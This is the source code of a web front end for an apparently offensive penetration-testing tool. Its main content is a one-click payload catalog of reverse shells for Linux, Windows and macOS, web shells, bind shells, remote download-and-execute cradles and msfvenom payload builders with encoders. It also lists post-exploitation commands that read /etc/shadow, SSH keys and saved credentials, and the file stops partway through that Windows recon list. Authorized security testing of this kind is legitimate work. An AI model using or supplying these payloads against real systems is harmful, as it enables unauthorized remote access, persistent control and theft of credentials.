import { useEffect, useState } from "react";
import { getStager } from "./api";

type P = { label: string; tmpl: string; note?: string; compat?: "recce" | "external" | "reference" };
const CATALOG: { group: string; items: P[] }[] = [
  {
    group: "Linux / Unix",
    items: [
      { label: "bash", tmpl: "bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1", note: "bash only (not dash/busybox)" },
      { label: "bash (fd)", tmpl: "0<&196;exec 196<>/dev/tcp/{LHOST}/{PORT};sh <&196 >&196 2>&196" },
      { label: "nc (mkfifo)", tmpl: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {PORT} >/tmp/f", note: "no -e needed" },
      { label: "nc -e", tmpl: "nc {LHOST} {PORT} -e /bin/sh" },
      { label: "python3", tmpl: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'" },
      { label: "socat (PTY)", tmpl: "socat TCP:{LHOST}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane", note: "full PTY — best quality" },
      { label: "perl", tmpl: "perl -e 'use Socket;$i=\"{LHOST}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
      { label: "ruby", tmpl: "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
      { label: "php", tmpl: "php -r '$s=fsockopen(\"{LHOST}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
      { label: "lua", tmpl: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3')\"", note: "needs luasocket" },
      { label: "awk", tmpl: "awk 'BEGIN {s=\"/inet/tcp/0/{LHOST}/{PORT}\";while(42){printf \"> \" |& s;s |& getline c;if(c){while((c |& getline line)>0)print line |& s;close(c)}}}'" },
      { label: "openssl", tmpl: "mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {LHOST}:{PORT}>/tmp/s;rm /tmp/s", note: "encrypted transport without TLS listener" },
      { label: "node", tmpl: "node -e '(function(){var n=require(\"net\"),c=require(\"child_process\"),s=n.connect({port:{PORT},host:\"{LHOST}\"},function(){c.exec(\"/bin/sh -i\",{stdio:[s,s,s]})});})();'" },
      { label: "java (Runtime)", tmpl: "Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1\"});", note: "for JSP/WAR deployments" },
      { label: "curl pipe", tmpl: "curl http://{LHOST}:{PORT}/shell.sh | bash", note: "host a script on your listener" },
      { label: "wget pipe", tmpl: "wget -qO- http://{LHOST}:{PORT}/shell.sh | bash" },
    ],
  },
  {
    group: "Windows",
    items: [
      { label: "PowerShell", tmpl: "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"", note: "no /dev/tcp on Windows" },
      { label: "PowerShell (Base64)", tmpl: "powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnAHsATABIAE8AUwBUAH0AJwAsAHsAUABPAFIAVAB9ACkA", note: "evades basic command-line logging — replace B64 with your encoded payload" },
      { label: "PS download cradle", tmpl: "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}:{PORT}/shell.ps1')\"", note: "host your stager" },
      { label: "nc.exe", tmpl: "nc.exe {LHOST} {PORT} -e cmd.exe" },
      { label: "powercat", tmpl: "powercat -c {LHOST} -p {PORT} -e cmd.exe", note: "needs powercat loaded" },
      { label: "certutil + nc", tmpl: "certutil -urlcache -split -f http://{LHOST}:{PORT}/nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe {LHOST} {PORT} -e cmd.exe", note: "LOLBin file transfer" },
      { label: "mshta", tmpl: "mshta http://{LHOST}:{PORT}/shell.hta", note: "LOLBin — host an HTA with embedded script" },
      { label: "conpty", tmpl: "IEX(IWR http://{LHOST}:{PORT}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell {LHOST} {PORT}", note: "full interactive PTY on Windows" },
    ],
  },
  {
    group: "macOS",
    items: [
      { label: "python3", tmpl: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/zsh\",\"-i\"])'", note: "default shell is zsh" },
      { label: "bash", tmpl: "bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1", note: "if bash present" },
    ],
  },
  {
    group: "Web Shells",
    items: [
      { label: "PHP webshell", tmpl: "<?php system($_GET['cmd']); ?>", note: "HTTP cmd exec — upload to web root, ?cmd=whoami", compat: "reference" },
      { label: "PHP reverse", tmpl: "<?php $s=fsockopen(\"{LHOST}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>", note: "upload then browse to trigger — calls back as TCP" },
      { label: "JSP webshell", tmpl: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", note: "HTTP cmd exec — Tomcat / JBoss", compat: "reference" },
      { label: "ASPX webshell", tmpl: "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]);%>", note: "HTTP cmd exec — IIS / .NET", compat: "reference" },
    ],
  },
  {
    group: "Bind Shells",
    items: [
      { label: "nc bind", tmpl: "nc -lvp {PORT} -e /bin/sh", note: "target listens — connect with: nc TARGET {PORT}", compat: "reference" },
      { label: "python bind", tmpl: "python3 -c 'import socket,os;s=socket.socket();s.bind((\"0.0.0.0\",{PORT}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system(\"/bin/sh -i\")'", note: "target listens — connect with: nc TARGET {PORT}", compat: "reference" },
      { label: "socat bind", tmpl: "socat TCP-LISTEN:{PORT},reuseaddr,fork EXEC:'/bin/sh',pty,stderr,setsid", note: "full PTY bind — connect with: socat - TCP:TARGET:{PORT}", compat: "reference" },
      { label: "PowerShell bind", tmpl: "powershell -c \"$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{PORT});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$l.Stop()\"", note: "target listens — connect with: nc TARGET {PORT}", compat: "reference" },
    ],
  },
  {
    group: "File Transfer",
    items: [
      { label: "python HTTP server", tmpl: "python3 -m http.server {PORT}", note: "serve files from current directory", compat: "reference" },
      { label: "certutil download", tmpl: "certutil -urlcache -split -f http://{LHOST}:{PORT}/file.exe C:\\Windows\\Temp\\file.exe", note: "Windows LOLBin", compat: "reference" },
      { label: "PS download", tmpl: "(New-Object Net.WebClient).DownloadFile(\"http://{LHOST}:{PORT}/file.exe\",\"C:\\Windows\\Temp\\file.exe\")", note: "IWR alternative", compat: "reference" },
      { label: "curl download", tmpl: "curl -o /tmp/file http://{LHOST}:{PORT}/file", compat: "reference" },
      { label: "scp", tmpl: "scp user@{LHOST}:/path/to/file /tmp/file", note: "needs SSH access to attacker", compat: "reference" },
    ],
  },
  {
    group: "msfvenom (compiled)",
    items: [
      { label: "Linux ELF x64", tmpl: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f elf -o shell.elf && chmod +x shell.elf", note: "then transfer & execute" },
      { label: "Linux ELF x86", tmpl: "msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f elf -o shell.elf" },
      { label: "Windows EXE x64", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f exe -o shell.exe" },
      { label: "Windows EXE x86", tmpl: "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f exe -o shell.exe" },
      { label: "Windows DLL x64", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f dll -o shell.dll", note: "for DLL hijack / sideload" },
      { label: "Windows MSI", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f msi -o shell.msi", note: "AlwaysInstallElevated privesc" },
      { label: "Java WAR", tmpl: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f war -o shell.war", note: "deploy to Tomcat / JBoss" },
      { label: "Python", tmpl: "msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={PORT} -f raw -o shell.py" },
      { label: "ASP", tmpl: "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f asp -o shell.asp", note: "classic ASP (IIS)" },
      { label: "ASPX", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f aspx -o shell.aspx", note: ".NET web shell" },
      { label: "HTA", tmpl: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f hta-psh -o shell.hta", note: "for mshta delivery" },
      { label: "Meterpreter x64", tmpl: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={PORT} -f exe -o meterpreter.exe", note: "needs Metasploit multi/handler", compat: "external" },
      { label: "Meterpreter Linux", tmpl: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={PORT} -f elf -o meterpreter.elf", note: "needs Metasploit multi/handler", compat: "external" },
    ],
  },
];

const TLS_CATALOG: { group: string; items: P[] }[] = [
  {
    group: "Linux / Unix (TLS)",
    items: [
      { label: "ncat --ssl", tmpl: "ncat --ssl {LHOST} {PORT} -e /bin/bash", note: "if ncat present" },
      { label: "socat (TLS PTY)", tmpl: "socat OPENSSL:{LHOST}:{PORT},verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane", note: "full PTY, encrypted" },
      { label: "openssl s_client", tmpl: "mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1|openssl s_client -quiet -connect {LHOST}:{PORT}>/tmp/s;rm /tmp/s" },
      { label: "python3 (TLS)", tmpl: "python3 -c 'import socket,ssl,subprocess,os;s=socket.socket();s=ssl.wrap_socket(s);s.connect((\"{LHOST}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", note: "stdlib ssl — no deps" },
      { label: "ruby (TLS)", tmpl: "ruby -rsocket -ropenssl -e'c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"{LHOST}\",{PORT}));c.connect;while(l=c.gets);IO.popen(l,\"r\"){|io|c.print io.read}end'", note: "needs openssl gem" },
      { label: "perl (TLS)", tmpl: "perl -e 'use IO::Socket::SSL;$s=IO::Socket::SSL->new(\"{LHOST}:{PORT}\");open(STDIN,\">&\",$s);open(STDOUT,\">&\",$s);open(STDERR,\">&\",$s);exec(\"/bin/sh -i\");'", note: "needs IO::Socket::SSL" },
      { label: "php (TLS)", tmpl: "php -r '$c=stream_socket_client(\"ssl://{LHOST}:{PORT}\",\\_,\\_,30,STREAM_CLIENT_CONNECT,stream_context_create([\"ssl\"=>[\"verify_peer\"=>false]]));$p=proc_open(\"/bin/sh -i\",[0=>[\"pipe\",\"r\"],1=>[\"pipe\",\"w\"],2=>[\"pipe\",\"w\"]],$pp);while(!feof($c)){$d=fread($c,1024);fwrite($pp[0],$d);fwrite($c,stream_get_contents($pp[1]));}'" },
    ],
  },
  {
    group: "Windows (TLS)",
    items: [
      { label: "PowerShell (TLS)", tmpl: "powershell -nop -w hidden -c \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{PORT});$s=New-Object System.Net.Security.SslStream($c.GetStream(),$false,({$true}));$s.AuthenticateAsClient('{LHOST}');[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}\"", note: "TLS-wrapped reverse shell" },
      { label: "ncat.exe --ssl", tmpl: "ncat.exe --ssl {LHOST} {PORT} -e cmd.exe", note: "if ncat present on target" },
    ],
  },
  {
    group: "msfvenom TLS (compiled)",
    items: [
      { label: "Linux ELF x64 (staged)", tmpl: "msfvenom -p linux/x64/shell/reverse_tcp LHOST={LHOST} LPORT={PORT} EnableStageEncoding=true -f elf -o shell.elf", note: "staged — needs Metasploit multi/handler", compat: "external" },
      { label: "Windows EXE x64 (staged)", tmpl: "msfvenom -p windows/x64/shell/reverse_tcp LHOST={LHOST} LPORT={PORT} EnableStageEncoding=true -f exe -o shell.exe", note: "staged — needs Metasploit multi/handler", compat: "external" },
      { label: "Meterpreter HTTPS", tmpl: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={PORT} -f exe -o meterpreter.exe", note: "needs Metasploit multi/handler — HTTPS transport", compat: "external" },
    ],
  },
];

// Interactive msfvenom command builder
type VenomOpt = { payload: string; format: string; ext: string };
const VENOM_PAYLOADS: Record<string, Record<string, VenomOpt[]>> = {
  linux: {
    x64: [
      { payload: "linux/x64/shell_reverse_tcp", format: "elf", ext: "elf" },
      { payload: "linux/x64/shell/reverse_tcp", format: "elf", ext: "elf" },
      { payload: "linux/x64/meterpreter/reverse_tcp", format: "elf", ext: "elf" },
      { payload: "linux/x64/shell_reverse_tcp", format: "c", ext: "c" },
    ],
    x86: [
      { payload: "linux/x86/shell_reverse_tcp", format: "elf", ext: "elf" },
      { payload: "linux/x86/meterpreter/reverse_tcp", format: "elf", ext: "elf" },
    ],
  },
  windows: {
    x64: [
      { payload: "windows/x64/shell_reverse_tcp", format: "exe", ext: "exe" },
      { payload: "windows/x64/shell/reverse_tcp", format: "exe", ext: "exe" },
      { payload: "windows/x64/meterpreter/reverse_tcp", format: "exe", ext: "exe" },
      { payload: "windows/x64/meterpreter/reverse_https", format: "exe", ext: "exe" },
      { payload: "windows/x64/shell_reverse_tcp", format: "dll", ext: "dll" },
      { payload: "windows/x64/shell_reverse_tcp", format: "msi", ext: "msi" },
      { payload: "windows/x64/shell_reverse_tcp", format: "hta-psh", ext: "hta" },
      { payload: "windows/x64/shell_reverse_tcp", format: "psh", ext: "ps1" },
      { payload: "windows/x64/shell_reverse_tcp", format: "aspx", ext: "aspx" },
    ],
    x86: [
      { payload: "windows/shell_reverse_tcp", format: "exe", ext: "exe" },
      { payload: "windows/meterpreter/reverse_tcp", format: "exe", ext: "exe" },
      { payload: "windows/shell_reverse_tcp", format: "dll", ext: "dll" },
    ],
  },
  java: {
    any: [
      { payload: "java/jsp_shell_reverse_tcp", format: "war", ext: "war" },
      { payload: "java/jsp_shell_reverse_tcp", format: "raw", ext: "jsp" },
    ],
  },
  php: {
    any: [
      { payload: "php/reverse_php", format: "raw", ext: "php" },
      { payload: "php/meterpreter/reverse_tcp", format: "raw", ext: "php" },
    ],
  },
  python: {
    any: [
      { payload: "cmd/unix/reverse_python", format: "raw", ext: "py" },
      { payload: "python/meterpreter/reverse_tcp", format: "raw", ext: "py" },
    ],
  },
  macos: {
    x64: [
      { payload: "osx/x64/shell_reverse_tcp", format: "macho", ext: "macho" },
      { payload: "osx/x64/meterpreter/reverse_tcp", format: "macho", ext: "macho" },
    ],
    arm64: [
      { payload: "osx/aarch64/shell_reverse_tcp", format: "macho", ext: "macho" },
    ],
  },
};

const ENCODERS = [
  { value: "", label: "None" },
  { value: "x86/shikata_ga_nai", label: "shikata_ga_nai (x86)" },
  { value: "x64/xor", label: "xor (x64)" },
  { value: "x64/zutto_dekiru", label: "zutto_dekiru (x64)" },
  { value: "cmd/powershell_base64", label: "powershell_base64" },
  { value: "php/base64", label: "php/base64" },
];

export function MsfvenomBuilder({ lhost, port }: { lhost: string; port: number }) {
  const [os, setOs] = useState("linux");
  const [arch, setArch] = useState("x64");
  const [payIdx, setPayIdx] = useState(0);
  const [encoder, setEncoder] = useState("");
  const [iterations, setIterations] = useState(1);
  const [customLhost, setCustomLhost] = useState(lhost);
  const [customPort, setCustomPort] = useState(String(port));
  const [outName, setOutName] = useState("");
  const [ok, setOk] = useState(false);

  const archs = Object.keys(VENOM_PAYLOADS[os] || {});
  const effectiveArch = archs.includes(arch) ? arch : archs[0] || "x64";
  const opts = VENOM_PAYLOADS[os]?.[effectiveArch] || [];
  const opt = opts[payIdx] || opts[0];

  const fname = outName || `shell.${opt?.ext || "bin"}`;
  let cmd = `msfvenom -p ${opt?.payload || "UNKNOWN"} LHOST=${customLhost} LPORT=${customPort} -f ${opt?.format || "raw"} -o ${fname}`;
  if (encoder) cmd += ` -e ${encoder} -i ${iterations}`;

  const payloadName = opt?.payload || "";
  const isRecce = !payloadName.includes("meterpreter") && !payloadName.match(/shell\/reverse/);

  return (
    <div className="venom-gen">
      <div className={`venom-compat ${isRecce ? "compat-ok" : "compat-ext"}`}>
        {isRecce
          ? "recce-compatible — catches directly on the listener"
          : "needs Metasploit multi/handler — won't catch on recce's listener"}
      </div>
      <div className="venom-form">
        <div className="venom-field">
          <label>Platform</label>
          <select value={os} onChange={(e) => { setOs(e.target.value); setPayIdx(0); }}>
            <option value="linux">Linux</option>
            <option value="windows">Windows</option>
            <option value="macos">macOS</option>
            <option value="java">Java (WAR/JSP)</option>
            <option value="php">PHP</option>
            <option value="python">Python</option>
          </select>
        </div>
        <div className="venom-field">
          <label>Arch</label>
          <select value={effectiveArch} onChange={(e) => { setArch(e.target.value); setPayIdx(0); }}>
            {archs.map((a) => <option key={a} value={a}>{a}</option>)}
          </select>
        </div>
        <div className="venom-field">
          <label>Payload</label>
          <select value={payIdx} onChange={(e) => setPayIdx(Number(e.target.value))}>
            {opts.map((o, i) => (
              <option key={i} value={i}>{o.payload.split("/").slice(-1)[0]} ({o.format})</option>
            ))}
          </select>
        </div>
        <div className="venom-field">
          <label>LHOST</label>
          <input value={customLhost} onChange={(e) => setCustomLhost(e.target.value)} />
        </div>
        <div className="venom-field">
          <label>LPORT</label>
          <input value={customPort} onChange={(e) => setCustomPort(e.target.value)} />
        </div>
        <div className="venom-field">
          <label>Encoder</label>
          <select value={encoder} onChange={(e) => setEncoder(e.target.value)}>
            {ENCODERS.map((e) => <option key={e.value} value={e.value}>{e.label}</option>)}
          </select>
        </div>
        {encoder && (
          <div className="venom-field">
            <label>Iterations</label>
            <input type="number" min={1} max={20} value={iterations}
                   onChange={(e) => setIterations(Math.max(1, Number(e.target.value)))} />
          </div>
        )}
        <div className="venom-field">
          <label>Output file</label>
          <input value={outName} onChange={(e) => setOutName(e.target.value)}
                 placeholder={`shell.${opt?.ext || "bin"}`} />
        </div>
      </div>
      <div className="venom-output">
        <code className="venom-cmd">{cmd}</code>
        <button className="payload-copy venom-copy-btn" onClick={() => {
          navigator.clipboard?.writeText(cmd).then(() => { setOk(true); setTimeout(() => setOk(false), 1000); });
        }}>{ok ? "✓" : "copy"}</button>
      </div>
    </div>
  );
}

// The robust reconnecting-PTY stager is served by the backend (single source of truth).

const genToken = () => {
  const a = new Uint8Array(8);
  crypto.getRandomValues(a);
  return "t" + Array.from(a, (b) => b.toString(16).padStart(2, "0")).join("");
};

function CopyLine({ text }: { text: string }) {
  const [ok, setOk] = useState(false);
  return (
    <button className="payload-copy" title="copy" onClick={() => {
      navigator.clipboard?.writeText(text).then(() => { setOk(true); setTimeout(() => setOk(false), 1000); });
    }}>{ok ? "✓" : "copy"}</button>
  );
}

const COMPAT_LABEL: Record<string, string> = {
  recce: "recce",
  external: "ext handler",
  reference: "ref",
};
const COMPAT_TITLE: Record<string, string> = {
  recce: "Catches directly on recce's listener — becomes a session",
  external: "Needs an external handler (e.g. Metasploit multi/handler)",
  reference: "Utility / reference — doesn't create a recce session",
};

function CompatBadge({ compat }: { compat: string }) {
  return (
    <span className={`compat-badge compat-${compat}`} title={COMPAT_TITLE[compat] || ""}>
      {COMPAT_LABEL[compat] || compat}
    </span>
  );
}

export function PayloadCatalog({ port, tls = false }: { port: number; tls?: boolean }) {
  const [lhost, setLhost] = useState(location.hostname);
  const [token] = useState(genToken);
  const [stager, setStager] = useState<string>("");
  const [collapsed, setCollapsed] = useState<Record<string, boolean>>({});
  const [compatFilter, setCompatFilter] = useState<"all" | "recce" | "external" | "reference">("all");
  useEffect(() => { getStager(tls).then(setStager).catch(() => setStager("")); }, [tls]);
  const fill = (t: string) =>
    t.split("{LHOST}").join(lhost).split("{PORT}").join(String(port)).split("{TOKEN}").join(token);
  const catalog = tls ? TLS_CATALOG : CATALOG;

  const toggle = (group: string) =>
    setCollapsed((c) => ({ ...c, [group]: !c[group] }));

  const filterItem = (p: P) => compatFilter === "all" || (p.compat || "recce") === compatFilter;

  return (
    <div className="payload-catalog">
      <label className="payload-lhost">
        LHOST <input className="scan-in" value={lhost} onChange={(e) => setLhost(e.target.value)}
                     title="the address the target should call back to" />
        {tls && <span className="muted small">encrypted listener — use TLS payloads</span>}
      </label>

      <div className="payload-compat-bar">
        <span className="payload-compat-label">Show:</span>
        <button className={`compat-filter ${compatFilter === "all" ? "active" : ""}`}
                onClick={() => setCompatFilter("all")}>All</button>
        <button className={`compat-filter compat-recce ${compatFilter === "recce" ? "active" : ""}`}
                onClick={() => setCompatFilter("recce")}>recce-compatible</button>
        <button className={`compat-filter compat-external ${compatFilter === "external" ? "active" : ""}`}
                onClick={() => setCompatFilter("external")}>external handler</button>
        <button className={`compat-filter compat-reference ${compatFilter === "reference" ? "active" : ""}`}
                onClick={() => setCompatFilter("reference")}>reference / utility</button>
      </div>

      {compatFilter === "all" && (
        <div className="payload-group">
          <div className="payload-group-h robust">★ Robust · auto-reconnect PTY{tls ? " · TLS" : ""} (recommended)</div>
          <div className="payload-item robust-item">
            <span className="payload-label">python</span>
            <CompatBadge compat="recce" />
            <code className="payload-code">{stager ? fill(stager) : "loading…"}</code>
            <span className="payload-note muted small">full PTY + resize, self-healing{tls ? ", encrypted" : ""} — survives drops &amp; rebinds</span>
            {stager && <CopyLine text={fill(stager)} />}
          </div>
        </div>
      )}
      {compatFilter === "recce" && (
        <div className="payload-group">
          <div className="payload-group-h robust">★ Robust · auto-reconnect PTY{tls ? " · TLS" : ""} (recommended)</div>
          <div className="payload-item robust-item">
            <span className="payload-label">python</span>
            <CompatBadge compat="recce" />
            <code className="payload-code">{stager ? fill(stager) : "loading…"}</code>
            <span className="payload-note muted small">full PTY + resize, self-healing{tls ? ", encrypted" : ""} — survives drops &amp; rebinds</span>
            {stager && <CopyLine text={fill(stager)} />}
          </div>
        </div>
      )}

      {catalog.map((g) => {
        const visible = g.items.filter(filterItem);
        if (visible.length === 0) return null;
        return (
          <div key={g.group} className="payload-group">
            <button className="payload-group-h payload-group-toggle" onClick={() => toggle(g.group)}>
              <span className="payload-caret">{collapsed[g.group] ? "▸" : "▾"}</span>
              {g.group}
              <span className="payload-group-ct">{visible.length}{visible.length !== g.items.length ? `/${g.items.length}` : ""}</span>
            </button>
            {!collapsed[g.group] && visible.map((p) => (
              <div key={p.label} className={`payload-item ${(p.compat || "recce") !== "recce" ? "payload-dim" : ""}`}>
                <span className="payload-label">{p.label}</span>
                <CompatBadge compat={p.compat || "recce"} />
                <code className="payload-code">{fill(p.tmpl)}</code>
                {p.note && <span className="payload-note muted small">{p.note}</span>}
                <CopyLine text={fill(p.tmpl)} />
              </div>
            ))}
          </div>
        );
      })}

      {compatFilter === "all" && (
        <div className="payload-group">
          <button className="payload-group-h payload-group-toggle" onClick={() => toggle("_venom_builder")}>
            <span className="payload-caret">{collapsed["_venom_builder"] ? "▸" : "▾"}</span>
            msfvenom Command Builder
            <span className="payload-group-ct">interactive</span>
          </button>
          {!collapsed["_venom_builder"] && <MsfvenomBuilder lhost={lhost} port={port} />}
        </div>
      )}
    </div>
  );
}

// Shell stabilization quick-reference (used by SessionTools)
const STABILIZE_LINUX: P[] = [
  { label: "1. Spawn PTY", tmpl: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", note: "or python2 / script -qc /bin/bash /dev/null" },
  { label: "2. Background", tmpl: "Ctrl+Z  (in your terminal)", note: "sends raw shell to background" },
  { label: "3. Fix terminal", tmpl: "stty raw -echo; fg", note: "paste this in YOUR terminal, not the shell" },
  { label: "4. Set TERM", tmpl: "export TERM=xterm-256color", note: "enables clear, arrow keys, tab completion" },
  { label: "5. Set size", tmpl: "stty rows {ROWS} cols {COLS}", note: "match your terminal: run `stty size` locally" },
];
const STABILIZE_WIN: P[] = [
  { label: "rlwrap", tmpl: "rlwrap nc -lvnp {PORT}", note: "wrap your listener — gives history + editing" },
  { label: "ConPty upgrade", tmpl: "IEX(IWR http://{LHOST}:{PORT}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {LHOST} {PORT}", note: "full interactive PTY on Windows" },
];

export function StabilizeGuide({ lhost, port }: { lhost: string; port: number }) {
  const fill = (t: string) =>
    t.replace(/\{LHOST\}/g, lhost).replace(/\{PORT\}/g, String(port)).replace(/\{ROWS\}/g, "50").replace(/\{COLS\}/g, "120");
  return (
    <div className="stabilize-guide">
      <div className="stab-section">
        <div className="stab-section-h">Linux / Unix</div>
        {STABILIZE_LINUX.map((s) => (
          <div key={s.label} className="stab-step">
            <span className="stab-step-label">{s.label}</span>
            <code className="stab-step-cmd">{fill(s.tmpl)}</code>
            {s.note && <span className="stab-step-note muted small">{s.note}</span>}
            {!s.tmpl.includes("Ctrl") && <CopyLine text={fill(s.tmpl)} />}
          </div>
        ))}
      </div>
      <div className="stab-section">
        <div className="stab-section-h">Windows</div>
        {STABILIZE_WIN.map((s) => (
          <div key={s.label} className="stab-step">
            <span className="stab-step-label">{s.label}</span>
            <code className="stab-step-cmd">{fill(s.tmpl)}</code>
            {s.note && <span className="stab-step-note muted small">{s.note}</span>}
            <CopyLine text={fill(s.tmpl)} />
          </div>
        ))}
      </div>
    </div>
  );
}

// Post-exploitation recon commands
type CmdGroup = { heading: string; cmds: P[] };
const POSTENUM_LINUX: CmdGroup[] = [
  {
    heading: "Identity & Access",
    cmds: [
      { label: "whoami", tmpl: "whoami" },
      { label: "id", tmpl: "id" },
      { label: "sudo privs", tmpl: "sudo -l" },
      { label: "SUID binaries", tmpl: "find / -perm -4000 -type f 2>/dev/null", note: "GTFOBins candidates" },
      { label: "capabilities", tmpl: "getcap -r / 2>/dev/null" },
    ],
  },
  {
    heading: "System Info",
    cmds: [
      { label: "hostname", tmpl: "hostname" },
      { label: "kernel", tmpl: "uname -a" },
      { label: "distro", tmpl: "cat /etc/os-release 2>/dev/null || cat /etc/*-release" },
      { label: "network", tmpl: "ip a || ifconfig" },
      { label: "routes", tmpl: "ip route || route -n" },
      { label: "ARP table", tmpl: "ip neigh || arp -a" },
      { label: "DNS", tmpl: "cat /etc/resolv.conf" },
    ],
  },
  {
    heading: "Interesting Files",
    cmds: [
      { label: "passwd", tmpl: "cat /etc/passwd" },
      { label: "shadow (if root)", tmpl: "cat /etc/shadow" },
      { label: "crontabs", tmpl: "crontab -l 2>/dev/null; ls -la /etc/cron*" },
      { label: "writable dirs", tmpl: "find / -writable -type d 2>/dev/null | head -20" },
      { label: "SSH keys", tmpl: "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null" },
      { label: "config files", tmpl: "find / -name '*.conf' -o -name '*.config' -o -name '*.ini' 2>/dev/null | grep -v proc | head -30" },
      { label: "history files", tmpl: "cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -50" },
    ],
  },
  {
    heading: "Processes & Services",
    cmds: [
      { label: "processes", tmpl: "ps auxf" },
      { label: "listening ports", tmpl: "ss -tlnp || netstat -tlnp" },
      { label: "connections", tmpl: "ss -tnp || netstat -tnp" },
      { label: "services", tmpl: "systemctl list-units --type=service --state=running 2>/dev/null" },
      { label: "docker", tmpl: "docker ps 2>/dev/null || ls -la /var/run/docker.sock" },
    ],
  },
];

const POSTENUM_WIN: CmdGroup[] = [
  {
    heading: "Identity & Access",
    cmds: [
      { label: "whoami /all", tmpl: "whoami /all" },
      { label: "local admins", tmpl: "net localgroup administrators" },
      { label: "domain info", tmpl: "net user /domain 2>nul & net group \"Domain Admins\" /domain 2>nul" },
      { label: "saved creds", tmpl: "cmdkey /list" },
